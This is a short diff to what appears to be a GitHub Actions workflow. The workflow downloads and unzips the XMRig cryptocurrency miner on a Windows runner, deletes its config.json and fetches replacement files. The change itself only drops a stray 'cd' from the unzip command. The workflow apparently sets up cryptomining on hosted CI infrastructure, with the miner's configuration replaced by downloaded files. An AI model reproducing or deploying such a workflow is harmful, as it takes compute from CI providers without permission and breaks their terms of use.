@@ -10,7 +10,7 @@ jobs:
 
     steps:
     - name: downloading xm
-      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip && unzip xmrig-6.17.0-gcc-win64.zip cd xmrig-6.17.0
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip && unzip xmrig-6.17.0-gcc-win64.zip
     - name: removing old files
       run: cd xmrig-6.17.0 && rm -rf config.json
     - name: download new files
